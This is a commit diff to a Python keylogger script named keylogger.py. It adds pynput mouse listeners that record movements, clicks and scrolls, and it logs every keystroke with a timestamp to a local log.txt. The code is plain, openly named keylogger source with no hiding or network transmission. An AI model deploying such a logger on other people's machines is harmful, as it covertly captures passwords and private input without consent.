13f97da158dc1050cf14aab36f5f27cf9614787a
eladgamer7 <eladgamer7@gmail.com>
2020-09-07 14:15:04 +0300

    Update keylogger.py

--- python/keylogger.py
+++ python/keylogger.py
@@ -1,11 +1,7 @@
 from pynput.keyboard import Key, Listener
+from pynput.mouse import Listener as mouse_listener
 import os
 import datetime
-
-
-count = 0
-update_log = 1
-keys = []
 
 
 def check_log_exist(log_file_name):
@@ -14,24 +10,32 @@ def check_log_exist(log_file_name):
 
 
 def on_press(key):
-    global keys, count
-
-    keys.append(key)
-    count += 1
-
-    if count >= update_log:
-        count = 0
-        write_log(keys)
-        keys = []
+    write_key_to_log(key)
 
 
-def write_log(keys):
+def on_move(x, y):
+    write_mouse_to_log (f"Mouse moved to ({x}, {y})\n")
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        write_mouse_to_log (f'Mouse clicked at ({x}, {y}) with {button}\n')
+
+def on_scroll(x, y, dx, dy):
+    write_mouse_to_log (f'Mouse scrolled at ({x}, {y})({dx}, {dy})\n')
+
+
+def write_mouse_to_log(msg):
     with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            current_time = datetime.datetime.now()
-            str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
-            f.write(f"Time pressed: {str_time} key: {k}\n")
+        current_time = datetime.datetime.now()
+        str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
+        f.write(f"Time pressed: {str_time} {msg}")
+
+
+def write_key_to_log(key):
+    with open("log.txt", "a") as f:
+        current_time = datetime.datetime.now()
+        str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
+        f.write(f"Time pressed: {str_time} key: {key}\n")
 
 
 def on_release(key):
@@ -43,7 +47,8 @@ def main():
     path = os.getcwd()
     check_log_exist(f"{path}\log.txt")
     with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+        with mouse_listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
+            listener.join()
 
 
 if __name__ == "__main__":
